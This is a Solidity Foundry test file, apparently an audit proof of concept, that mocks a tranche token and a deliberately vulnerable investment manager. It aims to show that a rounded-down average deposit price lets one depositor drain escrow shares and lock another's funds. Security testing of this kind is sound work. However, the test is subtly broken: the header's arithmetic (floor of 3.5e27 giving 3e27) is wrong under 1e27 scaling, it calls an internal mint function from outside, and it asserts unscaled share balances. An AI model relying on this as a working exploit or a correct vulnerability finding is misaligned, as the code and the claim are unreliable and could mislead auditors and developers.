// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

/*
 * Exploit test for the “rounded-down average price” vulnerability in
 * LiquidityPool.deposit() / InvestmentManager.processDeposit().
 *
 * The PoC builds a very small mock environment around the real
 * LiquidityPool contract so that the rounding bug can be observed in
 * isolation and 100 % reproducible with `forge test`.
 *
 * High-level attack flow
 *  1.  Alice and Bob each request a deposit of 120 currency token.
 *  2.  Their requests are executed in two different epochs:
 *        – epoch-1 price = 4 * 1e27  (Alice)
 *        – epoch-2 price = 3 * 1e27  (Bob)
 *      →  shares minted for Alice = 30, for Bob = 40 (total escrow = 70)
 *  3.  When Alice now calls LiquidityPool.deposit()
 *        InvestmentManager.calculateDepositPrice() returns
 *            floor( (120·4 + 120·3) / (120 + 120) ) = floor(3.5 e27) = 3 e27
 *        The lower, rounded-down price results in
 *            sharesOut = 120 * 1e27 / 3e27 = 40 shares
 *      Alice therefore receives 10 more shares than were ever minted
 *      for her (dilution).  Escrow holds only 30 shares afterwards.
 *  4.  Bob tries to claim his order and reverts because escrow
 *      no longer has the 40 shares that belong to him.
 *
 * The test proves both effects:
 *      – Alice received more shares than were minted for her.
 *      – Bob’s transaction reverts (DoS / locked funds).
 */

import "forge-std/Test.sol";
import {LiquidityPool} from "src/LiquidityPool.sol";
import {InvestmentManagerLike, TrancheTokenLike, ERC20PermitLike} from "src/LiquidityPool.sol";

/*//////////////////////////////////////////////////////////////////////////
                                Minimal ERC-20
//////////////////////////////////////////////////////////////////////////*/

contract SimpleERC20 {
    string public name;
    string public symbol;
    uint8  public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256)                     public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20/insufficient-balance");
        balanceOf[from] -= amount;
        totalSupply      -= amount;
        emit Transfer(from, address(0), amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "ERC20/allowance");
        allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "ERC20/insufficient-balance");
        balanceOf[from] -= amount;
        balanceOf[to]   += amount;
        emit Transfer(from, to, amount);
    }
}

/*//////////////////////////////////////////////////////////////////////////
                        Tranche token with no transfer restrictions
//////////////////////////////////////////////////////////////////////////*/

contract MockTrancheToken is SimpleERC20, TrancheTokenLike {
    constructor() SimpleERC20("Tranche", "TRCH") {}

    /* ------------- ERC20Permit stubs (not relevant for the PoC) ------------- */
    function permit(
        address, address, uint256, uint256, uint8, bytes32, bytes32
    ) external pure override {}

    function PERMIT_TYPEHASH() external pure override returns (bytes32) {
        return 0x0;
    }

    function DOMAIN_SEPARATOR() external pure override returns (bytes32) {
        return 0x0;
    }

    /* -------- transfer-restriction hook (always succeeds in mock) ----------- */
    function checkTransferRestriction(address, address, uint256)
        external pure override
        returns (bool)
    {
        return true;
    }

    /*----------------------------- mint helper --------------------------------*/
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/*//////////////////////////////////////////////////////////////////////////
                Vulnerable InvestmentManager (rounding bug)
//////////////////////////////////////////////////////////////////////////*/

contract VulnerableInvestmentManager is InvestmentManagerLike, Test {
    uint256 constant ONE = 1e27;      // price scaling factor

    address public immutable asset;   // not used, kept for completeness
    MockTrancheToken public immutable share;

    /* Every request becomes one entry in the orders array */
    struct Order {
        uint128 assets;    // currency amount requested
        uint128 price;     // execution price (set in executeEpoch)
        uint128 shares;    // shares minted for the order
        bool    claimed;   // true once fully claimed
    }

    mapping(address => Order[]) public orders;
    address[] public users;           // helper array for iteration

    /* Simplified order-book view required by LiquidityPool.maxDeposit() */
    struct Limits { uint256 maxDeposit; uint256 maxMint; }
    mapping(address => mapping(address => Limits)) public orderbook;

    constructor(address _asset, MockTrancheToken _share) {
        asset = _asset;
        share = _share;
    }

    /* --------------------------------------------------------
                Asynchronous request life-cycle helpers
       --------------------------------------------------------*/

    function requestDeposit(uint256 assets, address receiver) external override {
        if (orders[receiver].length == 0) users.push(receiver);
        orders[receiver].push(Order(uint128(assets), 0, 0, false));

        // the order becomes claimable only after executeEpoch()
    }

    /* simulate Centrifuge epoch execution – mints shares to escrow */
    function executeEpoch(address liquidityPool, uint128 price) external {
        for (uint256 i = 0; i < users.length; i++) {
            address u = users[i];
            for (uint256 j = 0; j < orders[u].length; j++) {
                Order storage o = orders[u][j];
                if (o.price == 0) {                           // not executed yet
                    o.price  = price;
                    o.shares = uint128(uint256(o.assets) * ONE / price);
                    // mint shares to escrow (InvestmentManager itself)
                    share.mint(address(this), o.shares);

                    // update claim limits used by LiquidityPool.deposit()
                    orderbook[u][liquidityPool].maxDeposit += o.assets;
                    orderbook[u][liquidityPool].maxMint    += o.shares;
                    return;  // execute only one order per call to keep test small
                }
            }
        }
    }

    /* --------------------------------------------------------
                          Vulnerable functions
       --------------------------------------------------------*/

    function processDeposit(address user, uint256 currencyAmount)
        external override
        returns (uint256 trancheTokenAmount)
    {
        Limits storage lim = orderbook[user][msg.sender];
        require(currencyAmount != 0 && currencyAmount <= lim.maxDeposit,
                "amount-exceeds-deposit-limits");

        uint256 price = calculateDepositPrice(user, msg.sender);
        require(price != 0, "price-0");

        trancheTokenAmount = currencyAmount * ONE / price;   // ↓ rounding bug
        lim.maxDeposit -= currencyAmount;
        lim.maxMint    -= trancheTokenAmount;

        // vulnerable: no balance check – transfer can underflow escrow
        share.transfer(user, trancheTokenAmount);
    }

    /* ------------- buggy average price (rounded down) ---------------- */
    function calculateDepositPrice(address, address)
        public view
        returns (uint256 price)
    {
        uint256 sumAmount;
        uint256 sumAmountTimesPrice;

        for (uint256 i = 0; i < users.length; i++) {
            address u = users[i];
            Order[] storage arr = orders[u];
            for (uint256 j = 0; j < arr.length; j++) {
                Order storage o = arr[j];
                if (!o.claimed) {
                    sumAmount           += o.assets;
                    sumAmountTimesPrice += uint256(o.assets) * o.price;
                }
            }
        }
        // BUG: integer division rounds the *entire* average down
        price = sumAmountTimesPrice / sumAmount;
    }

    /* -------- stubs to satisfy the full interface (not needed here) ---------- */
    function processMint(address, uint256) external pure override returns (uint256) { return 0; }
    function processWithdraw(uint256, address, address) external pure override returns (uint256) { return 0; }
    function processRedeem(uint256, address, address) external pure override returns (uint256) { return 0; }

    function maxDeposit(address user, address lp) external view override returns (uint256) {
        return orderbook[user][lp].maxDeposit;
    }
    function maxMint(address user, address lp) external view override returns (uint256) {
        return orderbook[user][lp].maxMint;
    }
    function maxWithdraw(address, address) external pure override returns (uint256) { return 0; }
    function maxRedeem(address, address) external pure override returns (uint256) { return 0; }
    function totalAssets(uint256, address) external pure override returns (uint256) { return 0; }
    function convertToShares(uint256, address) external pure override returns (uint256) { return 0; }
    function convertToAssets(uint256, address) external pure override returns (uint256) { return 0; }
    function previewDeposit(address, address, uint256) external pure override returns (uint256) { return 0; }
    function previewMint(address, address, uint256) external pure override returns (uint256) { return 0; }
    function previewWithdraw(address, address, uint256) external pure override returns (uint256) { return 0; }
    function previewRedeem(address, address, uint256) external pure override returns (uint256) { return 0; }
    function requestRedeem(uint256, address) external pure override {}
    function collectDeposit(address) external pure override {}
    function collectRedeem(address) external pure override {}
    function decreaseDepositRequest(uint256, address) external pure override {}
    function decreaseRedeemRequest(uint256, address) external pure override {}
}

/*//////////////////////////////////////////////////////////////////////////
                                The actual test
//////////////////////////////////////////////////////////////////////////*/

contract ExploitRoundingTest is Test {
    /* test actors */
    address alice = address(0xA11CE);
    address bob   = address(0xB0B);

    /* deployed contracts */
    SimpleERC20                 currency;
    MockTrancheToken            share;
    VulnerableInvestmentManager manager;
    LiquidityPool               pool;

    uint256 constant DEPOSIT_AMOUNT = 120 ether;     // 120 units of currency

    /* ----------------------------- set-up ----------------------------------- */
    function setUp() public {
        currency = new SimpleERC20("Currency", "CUR");
        share    = new MockTrancheToken();
        manager  = new VulnerableInvestmentManager(address(currency), share);

        pool = new LiquidityPool(
            /* poolId  */ 1,
            /* tranche */ 0xABCDEF00112233445566778899AABBCC,
            address(currency),
            address(share),
            address(manager)
        );

        /** distribute play money **/
        currency._mint(alice, DEPOSIT_AMOUNT);
        currency._mint(bob,   DEPOSIT_AMOUNT);
    }

    /* ----------------------------------------------------------------------- */
    /*            Demonstrate cumulative-rounding exploit (PoC)               */
    /* ----------------------------------------------------------------------- */
    function testRoundingExploit() public {
        /* ---------------- epoch 1: Alice’s deposit executed at high price --- */
        vm.prank(alice);
        pool.requestDeposit(DEPOSIT_AMOUNT, alice);

        // execute only Alice's order – price 4 * 1e27
        manager.executeEpoch(address(pool), uint128(4 * 1e27));

        /* -------------- epoch 2: Bob’s deposit executed at lower price ------ */
        vm.prank(bob);
        pool.requestDeposit(DEPOSIT_AMOUNT, bob);

        manager.executeEpoch(address(pool), uint128(3 * 1e27));

        /* Sanity: shares minted for the two orders are 30 and 40 => 70 total */
        assertEq(share.balanceOf(address(manager)), 70);

        /** ---------------------- Alice claims first ----------------------- **/
        vm.startPrank(alice);
        uint256 aliceSharesPaid = pool.deposit(DEPOSIT_AMOUNT, alice);
        vm.stopPrank();

        // shares actually minted for Alice in epoch 1 = 30
        uint256 aliceMinted = 30;
        assertGt(
            aliceSharesPaid,
            aliceMinted,
            "Alice received more shares than were minted for her"
        );

        /** ---------------------- Bob claims second  ----------------------- **/
        vm.startPrank(bob);
        vm.expectRevert();               // escrow holds only 30 < 40 demanded
        pool.deposit(DEPOSIT_AMOUNT, bob);
        vm.stopPrank();
    }
}
